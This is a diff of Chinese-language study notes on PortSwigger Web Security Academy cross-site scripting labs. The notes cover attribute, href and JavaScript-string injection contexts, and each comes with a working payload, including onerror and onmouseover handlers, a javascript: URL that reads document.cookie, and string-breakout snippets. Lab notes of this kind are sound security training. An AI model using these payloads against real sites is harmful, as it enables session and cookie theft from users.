@@ -19,7 +19,23 @@ https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#'"><img src=1
 1.https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#
 2.https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#'"><img src=1 onerror=alert(1)>
 
-例子2:
+例子2:用户可控制的值在属性中
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
+上下文是在属性中，所以逃逸引号就可以了
+"onmouseover="alert(1)
 
+例子3:用户可直接控制href的值
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
+javascript:alert(document.cookie)
 
+例子4:用户可控制的值inside a JavaScript string，比如这里是 var searchTerms = '用户可以控制的值'
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
+                   <script>
+                        var searchTerms = 'a13700';alert(1)//345';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    </script>
  
+Solution中用的是的是这样的方案也是可以弹窗的.可以在https://www.w3schools.com/上试一下
+<script>
+var searchTerms = ''-alert(1)-'';
+</script>
